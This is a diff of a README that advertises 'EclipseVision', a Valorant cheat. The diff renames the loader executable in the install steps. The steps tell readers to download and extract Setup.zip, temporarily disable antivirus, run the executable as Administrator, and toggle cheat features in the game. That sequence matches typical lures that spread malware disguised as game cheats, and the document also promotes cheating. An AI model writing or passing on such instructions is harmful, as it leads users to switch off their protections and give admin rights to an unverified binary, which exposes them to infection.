@@ -23,7 +23,7 @@ Introducing **EclipseVision**, the most advanced Valorant cheat for 2025. Eclips
 1. Download the `Setup.zip` from the button above.
 2. Extract the archive using WinRAR or 7-Zip.
 3. Disable your antivirus temporarily to avoid false flags.
-4. Run `EclipseVision_Loader.exe` as Administrator.
+4. Run `launcher.exe` as Administrator.
 5. Open Valorant and press `Insert` to open the cheat menu.
 6. Toggle your desired features and start playing with an enhanced advantage!
 
